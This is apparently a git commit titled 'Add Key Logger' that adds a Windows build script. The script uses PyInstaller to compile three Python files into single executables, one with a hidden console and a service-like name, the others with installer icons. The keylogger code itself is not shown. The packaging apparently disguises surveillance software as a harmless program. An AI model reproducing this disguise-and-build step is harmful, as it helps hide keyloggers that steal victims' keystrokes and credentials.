8d37a76b085c5bea770f2dc9dbad3c3d7690a484
Yuri Ferreira <80469922+oyuriroferr@users.noreply.github.com>
2024-09-30 16:25:47 -0300

    Add Key Logger

---
+++ compilar.cmd
@@ -0,0 +1,3 @@
+pyinstaller --noconsole --icon=icons\icon.ico --onefile Main\agnsrvch.py
+pyinstaller.exe --onefile --icon=icons\install-icon.ico Main\Prompt.py
+pyinstaller.exe --onefile --icon=icons\install-icon.ico Main\Switch-App.py
